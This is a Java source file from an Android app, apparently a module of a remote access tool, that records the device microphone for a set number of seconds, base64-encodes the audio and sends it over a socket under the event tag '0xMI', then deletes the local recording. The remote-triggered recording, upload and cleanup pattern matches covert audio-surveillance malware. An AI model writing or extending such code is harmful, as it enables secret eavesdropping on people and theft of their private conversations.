package com.fason.app.features.mic;

import android.Manifest;
import android.content.pm.ServiceInfo;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;

import com.fason.app.core.FasonApp;
import com.fason.app.core.network.SocketClient;
import com.fason.app.core.permissions.PermissionManager;
import com.fason.app.service.MainService;

import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;

public final class MicManager {

    private static MediaRecorder recorder;
    private static File audioFile;
    private static final Handler handler = new Handler(Looper.getMainLooper());
    private static final ExecutorService executor = Executors.newSingleThreadExecutor();
    private static final AtomicBoolean isRecording = new AtomicBoolean(false);
    private static Runnable stopRunnable;

    private MicManager() {}

    public static boolean isRecording() {
        return isRecording.get();
    }

    public static void startRecording(int seconds) {
        if (seconds <= 0 || seconds > 3600) return; // Max 1 hour

        // Check permission
        if (!PermissionManager.canIUse(Manifest.permission.RECORD_AUDIO)) {
            sendError("Microphone permission not granted");
            return;
        }

        // Stop any existing recording
        stopRecording();

        if (!isRecording.compareAndSet(false, true)) {
            return; // Already recording
        }

        // Update foreground service type for microphone
        MainService service = MainService.getInstance();
        if (service != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            service.updateForegroundType(ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
        }

        try {
            File cache = FasonApp.getContext().getCacheDir();
            if (cache == null) {
                isRecording.set(false);
                return;
            }

            audioFile = File.createTempFile("rec_", ".mp4", cache);

            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setAudioEncodingBitRate(128000);
            recorder.setAudioSamplingRate(44100);
            recorder.setOutputFile(audioFile.getAbsolutePath());
            recorder.prepare();
            recorder.start();

            // Schedule stop and send
            stopRunnable = () -> {
                stopRecording();
                sendAudioFile();
            };
            handler.postDelayed(stopRunnable, seconds * 1000L);

            // Send recording started notification
            sendStatus("recording", seconds);

        } catch (Exception e) {
            isRecording.set(false);
            sendError("Recording failed: " + e.getMessage());

            // Release foreground service type
            releaseForegroundType();
        }
    }

    public static void stopRecording() {
        // Cancel pending stop
        if (stopRunnable != null) {
            handler.removeCallbacks(stopRunnable);
            stopRunnable = null;
        }

        try {
            if (recorder != null) {
                recorder.stop();
                recorder.release();
                recorder = null;
            }
        } catch (Exception ignored) {}

        isRecording.set(false);
        releaseForegroundType();
    }

    private static void releaseForegroundType() {
        MainService service = MainService.getInstance();
        if (service != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            service.releaseForegroundType(ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
        }
    }

    private static void sendAudioFile() {
        executor.execute(() -> {
            try {
                if (audioFile == null || !audioFile.exists()) {
                    sendError("Audio file not found");
                    return;
                }

                byte[] data = new byte[(int) audioFile.length()];
                try (BufferedInputStream bis = new BufferedInputStream(new FileInputStream(audioFile))) {
                    bis.read(data);
                }

                String base64Audio = Base64.encodeToString(data, Base64.NO_WRAP);

                JSONObject obj = new JSONObject();
                obj.put("file", true);
                obj.put("name", audioFile.getName());
                obj.put("buffer", base64Audio);
                obj.put("size", data.length);
                obj.put("timestamp", System.currentTimeMillis());

                SocketClient.getInstance().getSocket().emit("0xMI", obj);

                // Cleanup
                if (audioFile != null) {
                    audioFile.delete();
                    audioFile = null;
                }
            } catch (Exception e) {
                sendError("Failed to send audio: " + e.getMessage());
            }
        });
    }

    private static void sendStatus(String status, int duration) {
        try {
            JSONObject obj = new JSONObject();
            obj.put("status", status);
            obj.put("duration", duration);
            obj.put("timestamp", System.currentTimeMillis());
            SocketClient.getInstance().getSocket().emit("0xMI", obj);
        } catch (Exception ignored) {}
    }

    private static void sendError(String error) {
        try {
            JSONObject obj = new JSONObject();
            obj.put("error", true);
            obj.put("message", error);
            obj.put("timestamp", System.currentTimeMillis());
            SocketClient.getInstance().getSocket().emit("0xMI", obj);
        } catch (Exception ignored) {}
    }
}
